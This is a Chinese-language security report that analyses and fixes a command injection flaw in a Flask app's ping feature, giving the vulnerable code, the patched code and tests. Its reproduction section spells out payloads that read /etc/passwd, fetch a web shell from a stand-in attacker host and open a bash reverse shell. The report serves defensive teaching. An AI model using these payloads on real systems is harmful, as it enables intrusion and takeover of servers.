# Ping 网络诊断功能——命令注入漏洞分析与修复

## 一、项目背景

本项目为 Flask 用户管理系统，近期新增了 **Ping 网络诊断功能**（`/ping` 路由），允许已登录用户输入 IP 地址或域名进行网络连通性测试。

由于初始实现使用 `shell=True` + f-string 字符串拼接的方式构建系统命令，引入了**命令注入漏洞（Command Injection）**，攻击者可通过构造恶意输入在服务器上执行任意系统命令。

---

## 二、新增功能完整实现代码（存在漏洞版本）

### 2.1 app.py 漏洞代码

```python
import subprocess
import platform
from flask import Flask, request, render_template

app = Flask(__name__)
# ==========原有业务代码保持不变==========

@app.route("/ping", methods=["GET", "POST"])
def ping():
    username = session.get("username")
    if not username:
        return redirect("/login")

    result = None
    ip = ""

    if request.method == "POST":
        ip = request.form.get("ip", "")
        if ip:
            try:
                # ⚠️ 漏洞代码：
                #   shell=True 启用 shell 解释器
                #   f-string 直接拼接用户输入
                cmd = f"ping -c 3 {ip}"
                output = subprocess.check_output(
                    cmd, shell=True, timeout=30, stderr=subprocess.STDOUT
                )
                result = output.decode("utf-8", errors="replace")
            except subprocess.TimeoutExpired:
                result = "错误：Ping 超时（超过 30 秒）"
            except subprocess.CalledProcessError as e:
                result = e.output.decode(...)
            except Exception as e:
                result = f"错误：{str(e)}"

    return render_template("ping.html", result=result, ip=ip)
```

### 2.2 templates/ping.html 页面代码

```html
{% extends "base.html" %}
{% block title %}Ping 测试{% endblock %}
{% block content %}
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input type="text" id="ip" name="ip" placeholder="例如：127.0.0.1 或 8.8.8.8">
    <button type="submit">Ping</button>
</form>
<pre class="ping-output">{{ result }}</pre>
{% endblock %}
```

---

## 三、漏洞分析：命令注入（Command Injection）

### 3.1 漏洞编号与分类

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 命令注入（Command Injection / OS Command Injection） |
| CWE 编号 | **CWE-78**: Improper Neutralization of Special Elements used in an OS Command |
| OWASP Top 10 | A03:2021 – Injection（注入攻击） |
| CVSS 3.x 评分 | **8.8（高危）** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 影响系统 | Linux / macOS / Windows（全平台） |

### 3.2 漏洞成因

**两个关键危险代码特征叠加：**

#### 特征一：`shell=True`

```python
subprocess.check_output(cmd, shell=True, ...)
```

`shell=True` 的含义是：通过系统 Shell（`/bin/sh` 或 `cmd.exe`）来执行命令字符串。Shell 会**解析字符串中的特殊字符**（如 `;`、`|`、`$()`、反引号等），将多条命令串联执行。

> **安全做法：** `shell=False`（默认值），命令参数以列表 `["ping", "-c", "3", "8.8.8.8"]` 形式传递，不经过 Shell 解释。

#### 特征二：f-string 拼接用户输入

```python
cmd = f"ping -c 3 {ip}"
```

用户输入直接成为命令字符串的一部分，没有经过任何校验或净化。

#### 攻击原理

```
攻击者输入：   8.8.8.8; id

生成的命令：   ping -c 3 8.8.8.8; id
                      ↑ Shell 将 ; 解释为"前一条命令结束，执行下一条"
                      → 先执行 ping -c 3 8.8.8.8
                      → 再执行 id（输出当前用户身份）
```

#### 可用的注入向量

| 注入符号 | 含义 | 攻击示例 |
|---------|------|---------|
| `;` | 命令分隔符 | `8.8.8.8; whoami` |
| `\|` | 管道 | `8.8.8.8\|whoami` |
| `&&` | 逻辑与 | `8.8.8.8 && whoami` |
| `\`\`` | 命令替换（反引号） | ``8.8.8.8`whoami` `` |
| `$()` | 命令替换（Bash） | `8.8.8.8$(whoami)` |
| `$(cat /flag)` | 嵌套命令 | `$(cat /flag)` |

### 3.3 漏洞触发位置

| 路由 | 方法 | 注入参数 | 漏洞行 |
|------|------|---------|--------|
| `/ping` | POST | `ip`（表单参数） | `cmd = f"ping -c 3 {ip}"` + `shell=True` |

### 3.4 漏洞复现 Payload

#### 基础检测

> **请求：**
> ```
> POST /ping
> Cookie: session=...
> Body: ip=127.0.0.1; echo INJECTED&csrf_token=...
> ```
>
> **响应中若包含 `INJECTED`，则确认命令注入成功。**

#### 信息收集

> **查看当前用户：**
> ```
> ip=; id
> ip=| whoami
> ```
>
> **查看服务器文件系统：**
> ```
> ip=; ls -la /
> ```
>
> **读取敏感文件：**
> ```
> ip=; cat /etc/passwd
> ```

#### 高危利用

> **远程命令执行（RCE）：**
> ```
> ip=; wget http://attacker.com/shell.php -O /var/www/html/shell.php
> ```
>
> **反弹 Shell：**
> ```
> ip=; bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
> ```

### 3.5 漏洞危害

| 危害类型 | 说明 | 严重程度 |
|---------|------|---------|
| 🚨 **远程命令执行** | 在服务器上以 Web 进程权限执行任意系统命令 | ⚠️ 高危 |
| 🔓 **数据泄露** | 读取数据库文件、配置文件、源码等所有可读文件 | ⚠️ 高危 |
| 🕸️ **内网渗透** | 以 Web 服务器为跳板，扫描攻击内部网络 | ⚠️ 高危 |
| 🔐 **持久化控制** | 植入后门、Webshell、定时任务 | ⚠️ 高危 |
| 💣 **横向移动** | 窃取数据库凭据，攻击其他服务器 | ⚠️ 高危 |

### 3.6 为什么 `shell=False` 能防御

```python
# ❌ 危险：shell=True + 字符串拼接
cmd = f"ping -c 3 {ip}"
subprocess.check_output(cmd, shell=True, ...)
# Shell 解释：ping -c 3 8.8.8.8; id  → 执行了两条命令

# ✅ 安全：shell=False + 参数列表
cmd = ["ping", "-c", "3", ip]
subprocess.check_output(cmd, shell=False, ...)
# 即使 ip = "8.8.8.8; id"，它也只是 ping 命令的一个普通参数
# ping 会尝试 ping 一个名为 "8.8.8.8; id" 的主机（DNS 解析失败，但安全）
```

---

## 四、漏洞修复代码（安全版本）

### 4.1 修复原理

**三层防御：**

1. **输入校验层（`validate_target` 函数）**
   - IPv4/IPv6 地址使用 `ipaddress` 模块严格校验
   - 域名使用正则白名单（仅允许 `字母.数字.连字符`）
   - 拒绝所有包含 `;`、`|`、`$`、反引号等 shell 特殊字符的输入

2. **命令执行层（`shell=False` + 参数列表）**
   - 使用 `["ping", "-c", "3", target]` 列表形式传参
   - 不经过系统 Shell 解释

3. **错误处理层**
   - 异常捕获并返回友好提示
   - 不泄露命令行或系统信息到前端

### 4.2 修复代码

```python
import ipaddress
import re
import shlex
import subprocess
import platform


def validate_target(target: str):
    """✅ 安全校验：验证目标地址是否合法
    
    支持：
      - IPv4 地址 (如 8.8.8.8)
      - IPv6 地址 (如 ::1)
      - 安全域名（仅允许字母、数字、连字符、点）
    返回合法字符串，或 None（非法时）
    """
    # 1. IP 地址严格校验
    try:
        ipaddress.ip_address(target)
        return target
    except ValueError:
        pass

    # 2. CIDR 格式（单个地址）
    try:
        ip_obj = ipaddress.ip_network(target, strict=False)
        if ip_obj.num_addresses == 1:
            return str(ip_obj.network_address)
    except ValueError:
        pass

    # 3. 域名 — 安全字符白名单
    allowed = re.compile(r'^[a-zA-Z0-9.\-]+$')
    if allowed.match(target) and len(target) <= 255:
        if "." in target:           # 必须包含点 (example.com)
            return target
        if target.lower() == "localhost":  # localhost 特殊放行
            return target

    return None


@app.route("/ping", methods=["GET", "POST"])
def ping():
    username = session.get("username")
    if not username:
        return redirect("/login")

    result = None
    ip = ""
    error = None

    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        if not ip:
            error = "请输入目标 IP 地址或域名"
        else:
            target = validate_target(ip)
            if target is None:
                error = "无效的 IP 地址或域名格式，仅允许合法的 IPv4/IPv6 或安全的域名"
            else:
                try:
                    # ✅ shell=False + 参数列表 = 杜绝命令注入
                    if platform.system() == "Windows":
                        cmd = ["ping", "-n", "3", target]
                    else:
                        cmd = ["ping", "-c", "3", target]
                    
                    output = subprocess.check_output(
                        cmd, shell=False, timeout=30, stderr=subprocess.STDOUT
                    )
                    result = output.decode("utf-8", errors="replace")
                except subprocess.TimeoutExpired:
                    error = "错误：Ping 超时（超过 30 秒）"
                except subprocess.CalledProcessError as e:
                    error = e.output.decode("utf-8", errors="replace") if e.output \
                            else f"错误：命令执行失败（返回码 {e.returncode}）"
                except Exception as e:
                    error = f"错误：{str(e)}"

    return render_template("ping.html", result=result, ip=ip, error=error)
```

### 4.3 修复前后对比

| 方面 | 漏洞版本 | 修复版本 |
|------|---------|---------|
| **导入模块** | `subprocess`, `platform` | `subprocess`, `platform`, `ipaddress`, `re`, `shlex` |
| **输入校验** | ❌ 无 | ✅ `ipaddress.ip_address()` + DNS白名单 `^[a-zA-Z0-9.\-]+$` |
| **命令构建** | `f"ping -c 3 {ip}"`（字符串拼接） | `["ping", "-c", "3", target]`（参数列表） |
| **Shell 模式** | `shell=True` | `shell=False` |
| **注入 `;id`** | ❌ 被当作新命令执行 | ✅ 被 `ipaddress` 校验拦截 |
| **注入 `\|whoami`** | ❌ 管道执行 | ✅ 正则白名单拒绝 `\|` 字符 |
| **跨平台** | 仅 Linux | ✅ Linux `-c` / Windows `-n` 自动适配 |
| **错误处理** | 返回原始错误消息 | 返回友好提示，不泄露系统信息 |
| **空输入** | 跳过执行 | 明确提示"请输入" |

### 4.4 安全校验测试矩阵

| 输入 | 预期行为 | 校验方式 |
|------|---------|---------|
| `8.8.8.8` | ✅ 通过 | `ipaddress.ip_address()` |
| `127.0.0.1` | ✅ 通过 | `ipaddress.ip_address()` |
| `::1` | ✅ 通过 | `ipaddress.ip_address()` |
| `example.com` | ✅ 通过 | 域名白名单 `^[a-zA-Z0-9.\-]+$` |
| `localhost` | ✅ 通过 | 特殊放行 |
| `8.8.8.8;id` | ❌ 拒绝 | 含 `;` 不匹配正则 |
| `\|whoami` | ❌ 拒绝 | 含 `\|` 不匹配正则 |
| `$(cat /flag)` | ❌ 拒绝 | 含 `$()` 不匹配正则 |
| `` `id` `` | ❌ 拒绝 | 含反引号不匹配正则 |
| `../etc` | ❌ 拒绝 | 含 `.` 开头但无合法域名结构 |

---

## 五、安全开发总结

### 5.1 漏洞本质

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 命令注入（OS Command Injection） |
| 根本诱因 | 用户可控数据**直接拼接进系统命令字符串**+ **`shell=True`** 启用 Shell 解释器 |
| 影响范围 | 所有调用系统命令的功能点（ping、nslookup、tracert、执行脚本等） |

### 5.2 标准防御方案（优先级排序）

#### 🥇 第一优先：避免调用系统命令

能用 Python 标准库实现的，绝不调用系统命令。

```
ping  →  python ping3 库 / icmp 库
nslookup →  socket.getaddrinfo() / dns.resolver
curl/wget →  requests.get()
```

#### 🥇 第二优先：`shell=False` + 参数列表

必须调用系统命令时：

```python
# ✅ 安全
subprocess.run(["ping", "-c", "3", target], shell=False)

# ❌ 危险
subprocess.run(f"ping -c 3 {target}", shell=True)
```

`shell=False` 时，参数以列表形式传递，**任意特殊字符都只是字符串参数**，不会被 Shell 解释为命令分隔符。

#### 🥉 第三优先：输入校验

如果必须使用字符串形式（不推荐），至少做严格校验：

- **IP 地址**：用 `ipaddress.ip_address()` 库函数校验（支持 IPv4 + IPv6）
- **域名**：仅允许 `[a-zA-Z0-9.-]` 白名单字符，且不超过 255 字符
- **拒绝所有 Shell 特殊字符**：`;` `|` `&` `$` `` ` `` `()` `{}` `<>` `!` `\` 等

#### 辅助：最小权限原则

- Web 服务使用低权限用户运行（非 root）
- 限制可执行命令的 PATH 环境变量
- 容器化运行（Docker），限制系统调用

### 5.3 无效防御提醒

以下措施**无法有效阻止**命令注入：

| 无效措施 | 绕过方式 |
|---------|---------|
| 仅过滤 `;` 符号 | 可用 `\|`、`&&`、`$()` 代替 |
| 仅过滤 `&&` | 可用 `;`、反引号、换行符代替 |
| 黑名单过滤 | 总有未考虑到的注入向量（Hex/Base64 编码命令） |
| 前端 JavaScript 校验 | 攻击者直接发送 HTTP 请求，不经过浏览器 |
| 仅替换空格 | 可用 `${IFS}` 或 `%09`（Tab）代替空格 |

**核心原则：** 永远不要试图穷举黑名单——应该使用白名单校验和 `shell=False`。

### 5.4 安全开发 Checklist

- [ ] 是否调用了系统命令？
- [ ] 是否可以使用 Python 库替代？
- [ ] 是否使用了 `shell=True`？（应改为 `shell=False`）
- [ ] 命令参数是否以列表形式传递？
- [ ] 用户输入是否经过白名单校验？
- [ ] 敏感信息（命令、路径）是否可能泄露到前端？
- [ ] 超时时间是否合理设置？
- [ ] 错误消息是否包含不应暴露的系统信息？
- [ ] 日志是否记录了安全事件？

### 5.5 修复验证

```python
def test_command_injection_fixed():
    client = app.test_client()
    with client.session_transaction() as sess:
        sess['username'] = 'test'
    
    # 正常功能正常
    r = client.post('/ping', data={
        'ip': '127.0.0.1', 'csrf_token': get_token(client)
    })
    assert b'bytes from' in r.data or b'ttl=' in r.data
    
    # 命令注入被拦截
    r2 = client.post('/ping', data={
        'ip': '127.0.0.1; id', 'csrf_token': get_token(client)
    })
    assert b'uid=' not in r.data  # id 命令不应被执行
    
    # 管道注入被拦截
    r3 = client.post('/ping', data={
        'ip': '8.8.8.8|whoami', 'csrf_token': get_token(client)
    })
    assert b'root' not in r.data or b'无效' in r.data
    
    # 空输入提示
    r4 = client.post('/ping', data={
        'ip': '', 'csrf_token': get_token(client)
    })
    assert b'请输入' in r.data
```

---

## 六、参考资料

| 资源 | 链接 |
|------|------|
| CWE-78: OS Command Injection | https://cwe.mitre.org/data/definitions/78.html |
| OWASP Command Injection | https://owasp.org/www-community/attacks/Command_Injection |
| OWASP Input Validation Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html |
| Python subprocess 官方文档 | https://docs.python.org/3/library/subprocess.html |
| Python ipaddress 模块 | https://docs.python.org/3/library/ipaddress.html |

---

> **报告日期：** 2026年7月26日
> **应用名称：** Flask 用户管理系统
> **功能点：** `/ping` 网络诊断
> **漏洞版本：** `shell=True` + f-string 拼接用户输入
> **修复版本：** `shell=False` + 参数列表 + `ipaddress` 输入校验 + 域名白名单
